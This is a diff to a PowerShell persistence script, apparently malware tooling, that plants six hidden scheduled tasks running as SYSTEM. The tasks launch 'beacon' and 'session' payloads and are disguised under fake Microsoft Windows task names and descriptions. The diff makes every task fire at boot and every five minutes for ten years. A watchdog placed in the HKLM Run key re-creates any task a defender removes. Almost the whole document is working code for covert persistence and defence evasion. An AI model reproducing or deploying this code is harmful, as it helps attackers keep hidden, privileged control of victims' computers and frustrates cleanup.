@@ -138,9 +138,7 @@ function New-PersistTask {
         [string]$TaskName,
         [string]$TaskFolder,
         [string]$PayloadPath,
-        [string]$Description,
-        [string]$TriggerType  = "AtStartup",
-        [int]$IntervalMinutes = 30
+        [string]$Description
     )
     try {
         if ($script:TaskSvc) {
@@ -151,15 +149,15 @@ function New-PersistTask {
             }
         }
 
-        $action   = New-ScheduledTaskAction -Execute "`"$PayloadPath`""
-        if ($TriggerType -eq "Interval") {
-            $trigger = New-ScheduledTaskTrigger `
-                -RepetitionInterval (New-TimeSpan -Minutes $IntervalMinutes) `
-                -RepetitionDuration (New-TimeSpan -Days 3650) `
-                -Once -At (Get-Date).AddSeconds(60)
-        } else {
-            $trigger = New-ScheduledTaskTrigger -AtStartup
-        }
+        $action      = New-ScheduledTaskAction -Execute "`"$PayloadPath`""
+        # Both triggers on every task: fires at boot AND every 5 min while running.
+        # Boot-only tasks die permanently if killed; interval-only tasks miss the first
+        # boot window. Combining both covers all cases.
+        $bootTrigger = New-ScheduledTaskTrigger -AtStartup
+        $intTrigger  = New-ScheduledTaskTrigger `
+            -RepetitionInterval (New-TimeSpan -Minutes 5) `
+            -RepetitionDuration (New-TimeSpan -Days 3650) `
+            -Once -At (Get-Date).AddSeconds(60)
         $settings  = New-ScheduledTaskSettingsSet -Hidden -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false
         $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
         $taskPath  = "\$TaskFolder\"
@@ -169,7 +167,7 @@ function New-PersistTask {
             -TaskName    $TaskName `
             -TaskPath    $taskPath `
             -Action      $action `
-            -Trigger     $trigger `
+            -Trigger     @($bootTrigger, $intTrigger) `
             -Settings    $settings `
             -Principal   $principal `
             -Description $Description `
@@ -192,27 +190,27 @@ $ts3 = Copy-Hidden $SessionPath (Join-Path (Get-DropDir) "${pfx}regbackup-svc.ex
 
 # [1] beacon - AtStartup
 Write-Info "[1/6] PerfTrack-StandardCollector -- beacon (AtStartup)"
-if ($tb1 -and (New-PersistTask "PerfTrack-StandardCollector" "Microsoft\Windows\PerfTrack" $tb1 "Microsoft Diagnostics Hub standard data collector service")) { $script:Ok++ } else { $script:Fail++ }
+if ($tb1 -and (New-PersistTask "PerfTrack-StandardCollector" "Microsoft\Windows\PerfTrack"  $tb1 "Microsoft Diagnostics Hub standard data collector service")) { $script:Ok++ } else { $script:Fail++ }
 
-# [2] beacon - AtStartup
-Write-Info "[2/6] StorOptimizer -- beacon (AtStartup)"
-if ($tb2 -and (New-PersistTask "StorOptimizer" "Microsoft\Windows\Defrag" $tb2 "Windows storage optimization service host")) { $script:Ok++ } else { $script:Fail++ }
+# [2] beacon - Boot + 5min
+Write-Info "[2/6] StorOptimizer -- beacon (Boot + 5min)"
+if ($tb2 -and (New-PersistTask "StorOptimizer"               "Microsoft\Windows\Defrag"      $tb2 "Windows storage optimization service host"))                        { $script:Ok++ } else { $script:Fail++ }
 
-# [3] beacon - AtStartup
-Write-Info "[3/6] NetworkDiagLogger -- beacon (AtStartup)"
-if ($tb3 -and (New-PersistTask "NetworkDiagLogger" "Microsoft\Windows\NetTrace" $tb3 "Windows network diagnostic event logger")) { $script:Ok++ } else { $script:Fail++ }
+# [3] beacon - Boot + 5min
+Write-Info "[3/6] NetworkDiagLogger -- beacon (Boot + 5min)"
+if ($tb3 -and (New-PersistTask "NetworkDiagLogger"           "Microsoft\Windows\NetTrace"    $tb3 "Windows network diagnostic event logger"))                          { $script:Ok++ } else { $script:Fail++ }
 
-# [4] session - 30 min interval
-Write-Info "[4/6] UsoCore-ServiceHandler -- session (30min)"
-if ($ts1 -and (New-PersistTask "UsoCore-ServiceHandler" "Microsoft\Windows\USOPrivate" $ts1 "Windows Update notification icon handler" "Interval" 30)) { $script:Ok++ } else { $script:Fail++ }
+# [4] session - Boot + 5min
+Write-Info "[4/6] UsoCore-ServiceHandler -- session (Boot + 5min)"
+if ($ts1 -and (New-PersistTask "UsoCore-ServiceHandler"      "Microsoft\Windows\USOPrivate"  $ts1 "Windows Update notification icon handler"))                         { $script:Ok++ } else { $script:Fail++ }
 
-# [5] session - 30 min interval
-Write-Info "[5/6] SilentCleanup2 -- session (30min)"
-if ($ts2 -and (New-PersistTask "SilentCleanup2" "Microsoft\Windows\DiskCleanup" $ts2 "Windows disk storage cleanup optimization service" "Interval" 30)) { $script:Ok++ } else { $script:Fail++ }
+# [5] session - Boot + 5min
+Write-Info "[5/6] SilentCleanup2 -- session (Boot + 5min)"
+if ($ts2 -and (New-PersistTask "SilentCleanup2"              "Microsoft\Windows\DiskCleanup" $ts2 "Windows disk storage cleanup optimization service"))                { $script:Ok++ } else { $script:Fail++ }
 
-# [6] session - 30 min interval
-Write-Info "[6/6] RegIdleBackup2 -- session (30min)"
-if ($ts3 -and (New-PersistTask "RegIdleBackup2" "Microsoft\Windows\Registry" $ts3 "Windows registry idle backup service host" "Interval" 30)) { $script:Ok++ } else { $script:Fail++ }
+# [6] session - Boot + 5min
+Write-Info "[6/6] RegIdleBackup2 -- session (Boot + 5min)"
+if ($ts3 -and (New-PersistTask "RegIdleBackup2"              "Microsoft\Windows\Registry"    $ts3 "Windows registry idle backup service host"))                        { $script:Ok++ } else { $script:Fail++ }
 
 # =============================================================================
 # WATCHDOG + HKLM RUN LAUNCHER
@@ -223,12 +221,12 @@ $watchdogPath = Join-Path $DropDirs[0] "${pfx}task-watchdog.ps1"
 
 # Build per-task lines to embed in the watchdog (paths baked in at plant time)
 $taskLines = @(
-    "    @{ Name='PerfTrack-StandardCollector'; Folder='Microsoft\Windows\PerfTrack';  Payload='$tb1'; Trigger='AtStartup'; Interval=0  }",
-    "    @{ Name='StorOptimizer';               Folder='Microsoft\Windows\Defrag';      Payload='$tb2'; Trigger='AtStartup'; Interval=0  }",
-    "    @{ Name='NetworkDiagLogger';           Folder='Microsoft\Windows\NetTrace';    Payload='$tb3'; Trigger='AtStartup'; Interval=0  }",
-    "    @{ Name='UsoCore-ServiceHandler';      Folder='Microsoft\Windows\USOPrivate';  Payload='$ts1'; Trigger='Interval';  Interval=30 }",
-    "    @{ Name='SilentCleanup2';             Folder='Microsoft\Windows\DiskCleanup'; Payload='$ts2'; Trigger='Interval';  Interval=30 }",
-    "    @{ Name='RegIdleBackup2';             Folder='Microsoft\Windows\Registry';    Payload='$ts3'; Trigger='Interval';  Interval=30 }"
+    "    @{ Name='PerfTrack-StandardCollector'; Folder='Microsoft\Windows\PerfTrack';  Payload='$tb1' }",
+    "    @{ Name='StorOptimizer';               Folder='Microsoft\Windows\Defrag';      Payload='$tb2' }",
+    "    @{ Name='NetworkDiagLogger';           Folder='Microsoft\Windows\NetTrace';    Payload='$tb3' }",
+    "    @{ Name='UsoCore-ServiceHandler';      Folder='Microsoft\Windows\USOPrivate';  Payload='$ts1' }",
+    "    @{ Name='SilentCleanup2';             Folder='Microsoft\Windows\DiskCleanup'; Payload='$ts2' }",
+    "    @{ Name='RegIdleBackup2';             Folder='Microsoft\Windows\Registry';    Payload='$ts3' }"
 )
 $taskBlock = $taskLines -join "`r`n"
 
@@ -241,13 +239,10 @@ $svc = New-Object -ComObject Schedule.Service
 $svc.Connect()
 foreach ($t in $tasks) {
     if (-not (Get-ScheduledTask -TaskName $t.Name -ErrorAction SilentlyContinue)) {
-        $action   = New-ScheduledTaskAction -Execute "`"$($t.Payload)`""
-        if ($t.Trigger -eq 'Interval') {
-            $trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes $t.Interval) `
-                -RepetitionDuration (New-TimeSpan -Days 3650) -Once -At (Get-Date).AddSeconds(60)
-        } else {
-            $trigger = New-ScheduledTaskTrigger -AtStartup
-        }
+        $action      = New-ScheduledTaskAction -Execute "`"$($t.Payload)`""
+        $bootTrigger = New-ScheduledTaskTrigger -AtStartup
+        $intTrigger  = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 5) `
+            -RepetitionDuration (New-TimeSpan -Days 3650) -Once -At (Get-Date).AddSeconds(60)
         $settings  = New-ScheduledTaskSettingsSet -Hidden -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false
         $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
         $taskPath  = "\$($t.Folder)\"
@@ -256,8 +251,9 @@ foreach ($t in $tasks) {
             $cur   = $svc.GetFolder("\")
             foreach ($part in $parts) { try { $cur = $cur.GetFolder($part) } catch { $cur = $cur.CreateFolder($part) } }
         } catch {}
-        Register-ScheduledTask -TaskName $t.Name -TaskPath $taskPath -Action $action -Trigger $trigger `
-            -Settings $settings -Principal $principal -Force -ErrorAction SilentlyContinue | Out-Null
+        Register-ScheduledTask -TaskName $t.Name -TaskPath $taskPath -Action $action `
+            -Trigger @($bootTrigger, $intTrigger) -Settings $settings -Principal $principal `
+            -Force -ErrorAction SilentlyContinue | Out-Null
     }
 }
 '@
@@ -294,12 +290,12 @@ Write-Warn " Task Watchdog Planter -- Complete"
 Write-Warn "================================================================"
 Write-Host ""
 Write-Host "  --- SCHEDULED TASKS (6) ---" -ForegroundColor Magenta
-Write-Host "  [1] \Microsoft\Windows\PerfTrack\PerfTrack-StandardCollector  beacon  AtStartup" -ForegroundColor Cyan
-Write-Host "  [2] \Microsoft\Windows\Defrag\StorOptimizer                   beacon  AtStartup" -ForegroundColor Cyan
-Write-Host "  [3] \Microsoft\Windows\NetTrace\NetworkDiagLogger             beacon  AtStartup" -ForegroundColor Cyan
-Write-Host "  [4] \Microsoft\Windows\USOPrivate\UsoCore-ServiceHandler      session 30min"     -ForegroundColor Cyan
-Write-Host "  [5] \Microsoft\Windows\DiskCleanup\SilentCleanup2            session 30min"     -ForegroundColor Cyan
-Write-Host "  [6] \Microsoft\Windows\Registry\RegIdleBackup2               session 30min"     -ForegroundColor Cyan
+Write-Host "  [1] \Microsoft\Windows\PerfTrack\PerfTrack-StandardCollector  beacon  Boot+5min" -ForegroundColor Cyan
+Write-Host "  [2] \Microsoft\Windows\Defrag\StorOptimizer                   beacon  Boot+5min" -ForegroundColor Cyan
+Write-Host "  [3] \Microsoft\Windows\NetTrace\NetworkDiagLogger             beacon  Boot+5min" -ForegroundColor Cyan
+Write-Host "  [4] \Microsoft\Windows\USOPrivate\UsoCore-ServiceHandler      session Boot+5min" -ForegroundColor Cyan
+Write-Host "  [5] \Microsoft\Windows\DiskCleanup\SilentCleanup2            session Boot+5min" -ForegroundColor Cyan
+Write-Host "  [6] \Microsoft\Windows\Registry\RegIdleBackup2               session Boot+5min" -ForegroundColor Cyan
 Write-Host "  --- WATCHDOG (1) ---" -ForegroundColor Magenta
 Write-Host "  [7] HKLM Run ${pfx}WinTaskWatchdog -> re-plants cleared tasks on boot" -ForegroundColor Cyan
 Write-Host ""
